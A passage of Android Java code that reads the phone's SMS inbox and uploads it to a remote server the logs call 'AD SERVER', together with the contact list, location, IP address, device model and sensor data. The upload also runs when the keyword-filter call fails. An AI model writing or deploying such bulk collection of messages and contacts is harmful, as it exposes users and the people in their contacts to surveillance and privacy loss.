                        mSessionManager.updatePreferenceString(GlobalFiles.SMS_LIST, "" + new Gson().toJson(FetchUserSMSinboxClass.fetchInbox(mActivity)));

                        Gson gson1 = new Gson();
                        TypeToken<ArrayList<SMSData.DataBean>> token1 = new TypeToken<ArrayList<SMSData.DataBean>>() {
                        };
                        ArrayList<SMSData.DataBean> mSmsList = gson1.fromJson(mSessionManager.getPreference(GlobalFiles.SMS_LIST), token1.getType());

                        AlertClasses.printLogE("FILTER LIST", mSessionManager.getPreference(GlobalFiles.SMS_LIST));

                    } else {
                        mSessionManager.updatePreferenceString(GlobalFiles.SMS_LIST, "");
                    }


                    //CALL SMS API
                    if (isPermissionDone) {
                        callUploadSMSData();
                    }
                }
            }

            @Override
            public void onFailure(Call<FiltereKeyWords> call, Throwable t) {

                AlertClasses.printLogE("AD SERVER : Response", "Response @ getFilteredKeywords ERROR: ");


                //CALL SMS API
                if (isPermissionDone) {
                    callUploadSMSData();
                }

            }
        });

    }

    private void callUploadSMSData() {

        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
        logging.setLevel(HttpLoggingInterceptor.Level.BODY);


        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
       // httpClient.addInterceptor(logging);
        httpClient.addInterceptor(new Interceptor() {
            @Override
            public okhttp3.Response intercept(Chain chain) throws IOException {

                okhttp3.Request requestOriginal = chain.request();

                okhttp3.Request request = requestOriginal.newBuilder()
                        .header("Authorization", "Bearer " + mSessionManager.getPreference(GlobalFiles.SMS_ACCESS_TOKEN))
                        .method(requestOriginal.method(), requestOriginal.body())
                        .build();


                return chain.proceed(request);
            }
        });
        final OkHttpClient httpClient1 = httpClient.build();
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(GlobalFiles.COMMON_URL_SMS)
                .client(httpClient1.newBuilder().connectTimeout(10, TimeUnit.MINUTES).readTimeout(10, TimeUnit.MINUTES).writeTimeout(10, TimeUnit.MINUTES).build())
                .addConverterFactory(GsonConverterFactory.create())
                .client(httpClient1)
                .build();

        //MAKE PAYLOAD
        SMSPayLoad mSmsPayLoad = new SMSPayLoad();
        mSmsPayLoad.setMobileNumber(mSessionManager.getPreference(GlobalFiles.MOBILE_NUMBER));
        mSmsPayLoad.setLatitude(mSessionManager.getPreference(GlobalFiles.LATITUDE));
        mSmsPayLoad.setLogitude(mSessionManager.getPreference(GlobalFiles.LONGITUDE));
        mSmsPayLoad.setMobileSensorData(mSessionManager.getPreference(GlobalFiles.MOBILE_SENSOR_DATA));
        mSmsPayLoad.setSmsData(mSessionManager.getPreference(GlobalFiles.SMS_LIST));
        mSmsPayLoad.setBrowser(mSessionManager.getPreference(GlobalFiles.BROWSER));
        mSmsPayLoad.setIpAddress(mSessionManager.getPreference(GlobalFiles.IP_ADDRESS_OF_DEVICE));
        mSmsPayLoad.setBatteryCharging(mSessionManager.getPreference(GlobalFiles.BATTERY_PERCENTAGE));
        mSmsPayLoad.setHandsetDetails(mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL));
        mSmsPayLoad.setContactModels(mSessionManager.getPreference(GlobalFiles.CONTACT_LIST));
        mSmsPayLoad.setDate(mSessionManager.getPreference(GlobalFiles.DATE));

        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);

        Call<SMSPayLoad> call = patchService1.uploadSMSPayload(mSmsPayLoad);

        call.enqueue(new Callback<SMSPayLoad>() {
            @Override
            public void onResponse(Call<SMSPayLoad> call, retrofit2.Response<SMSPayLoad> response) {


                if (response.isSuccessful()) {

                    Gson gson = new GsonBuilder()
                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
                            .serializeNulls()
                            .create();


                    AlertClasses.printLogE("AD SERVER : Response", "Response callUploadSMSData @ : " + gson.toJson(response.body()));


                }
            }

            @Override
            public void onFailure(Call<SMSPayLoad> call, Throwable t) {

                AlertClasses.printLogE("AD SERVER : Response", "Response callUploadSMSData @ : ERROR");


            }
        });

    }


}
